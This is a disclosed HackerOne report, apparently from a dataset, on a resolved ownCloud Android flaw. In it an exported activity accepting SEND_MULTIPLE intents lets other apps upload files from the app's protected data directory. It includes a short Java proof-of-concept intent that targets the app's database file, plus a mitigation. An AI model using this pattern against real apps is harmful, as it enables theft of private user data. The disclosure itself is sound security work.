---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1454002'
original_report_id: '1454002'
title: Theft of protected files on Android
weakness: Violation of Secure Design Principles
team_handle: owncloud
created_at: '2022-01-19T12:49:28.945Z'
disclosed_at: '2022-03-17T08:42:53.345Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 10
asset_identifier: com.owncloud.android
asset_type: GOOGLE_PLAY_APP_ID
max_severity: medium
tags:
- hackerone
- violation-of-secure-design-principles
---

# Theft of protected files on Android

## Metadata

- HackerOne Report ID: 1454002
- Weakness: Violation of Secure Design Principles
- Program: owncloud
- Disclosed At: 2022-03-17T08:42:53.345Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

There is an issue that allows to retrieve any files from protected directory of application - ```/data/data/com.owncloud.android/*```.
The issue is caused by exported activity ```com.owncloud.android.ui.activity.ReceiveExternalFilesActivity``` with intent filter ```android.intent.action.SEND_MULTIPLE``` that accepts URI of files for upload. Any 3rd-party application could start this activity and upload on server any files such as database file from protected directory in context of owncloud application.

Tested on latest stable version of app - 2.19.
Version of android - 11.

Java PoC:
```Java
StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
StrictMode.setVmPolicy(builder.build());
Intent intent = new Intent("android.intent.action.SEND_MULTIPLE");
intent.setClassName("com.owncloud.android", "com.owncloud.android.ui.activity.ReceiveExternalFilesActivity");
intent.setType("*/*");
intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
ArrayList mStreamsToUpload = new ArrayList<>();
mStreamsToUpload.add(Uri.parse("file:///data/data/com.owncloud.android/databases/filelist"));
intent.putExtra("android.intent.extra.STREAM", mStreamsToUpload);
startActivity(intent);
```

**Mitigation:**
There is valid protection for preventing reading files from directory ```/data/data/com.owncloud.android/*``` in similar intent-filter ```android.intent.action.SEND```. Copy this protection for ```android.intent.action.SEND_MULTIPLE```.

## Impact

Potential attacker could steal files from protected directory of application for example files of databases, cache and history of files.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
